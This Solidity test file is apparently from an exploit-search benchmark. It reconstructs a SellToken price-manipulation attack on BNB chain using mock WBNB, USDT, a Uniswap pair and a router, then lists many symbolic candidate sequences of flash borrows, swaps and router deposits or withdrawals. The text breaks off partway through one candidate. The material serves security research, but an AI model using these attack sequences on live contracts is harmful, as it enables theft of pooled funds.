// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {SellTokenRouter} from "./SellTokenRouter.sol";
import {SellToken} from "./SellToken.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract SellTokenTest is Test, BlockLoader {
    SellToken sellc;
    WBNB wbnb;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    SellTokenRouter srouter;
    AttackContract attackContract;
    address owner;
    address attacker;
    address sellcAddr;
    address wbnbAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address srouterAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1683961933;
    uint112 reserve0pair = 10131261910696925365107624;
    uint112 reserve1pair = 419961013712194393900;
    uint32 blockTimestampLastpair = 1683961924;
    uint256 kLastpair = 4159325301352573688381382723610973491088178532;
    uint256 price0CumulativeLastpair = 682185278574784335190748314510070123;
    uint256 price1CumulativeLastpair =
        266744938578392807947699573283293198241546079;
    uint256 totalSupplysellc = 100000000000000000000000000;
    uint256 balanceOfsellcpair = 10131261910696925365107624;
    uint256 balanceOfsellcattacker = 0;
    uint256 totalSupplywbnb = 3110714230675105092486184;
    uint256 balanceOfwbnbpair = 419961013712194393900;
    uint256 balanceOfwbnbattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        usdt = new USDT();
        usdtAddr = address(usdt);
        sellc = new SellToken();
        sellcAddr = address(sellc);
        pair = new UniswapV2Pair(
            address(sellc),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(wbnb),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0x0));
        routerAddr = address(router);
        srouter = new SellTokenRouter(
            address(wbnb),
            address(usdt),
            address(sellc),
            address(router)
        );
        srouterAddr = address(srouter);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        sellc.transfer(address(pair), balanceOfsellcpair);
        sellc.transfer(address(srouter.mkt()), 1020918 ether);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Sellc Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(sellc),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(sellc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(sellc),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(wbnb),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(wbnb),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(usdt),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(usdt),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(pair),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Srouter Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(srouter),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(srouter),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(srouter),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sellc),
            address(attacker),
            sellc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e6 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_sellc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        sellc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sellc_owner(uint256 amount) internal eurus {
        sellc.transfer(owner, amount);
    }

    function swap_pair_attacker_sellc_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        sellc.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_sellc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_srouter_wbnb_sellc(uint256 amount) internal eurus {
        srouter.setTokenPrice(address(sellc));
        IERC20(wbnb).transfer(address(srouter.mkt()), amount);
        srouter.ShortStart(address(sellc), address(attacker), 1, amount);
    }

    function withdraw_srouter_sellc_wbnb(uint256 amount) internal eurus {
        srouter.withdraw(address(sellc));
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt4 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        payback_wbnb_owner(amt4);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt4 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        payback_wbnb_owner(amt4);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt3 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        payback_wbnb_owner(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        payback_sellc_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt4 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        payback_sellc_owner(amt4);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        payback_sellc_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt4 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        payback_sellc_owner(amt4);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt3 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        payback_sellc_owner(amt3);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        payback_sellc_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        swap_pair_attacker_sellc_wbnb(amt2, amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
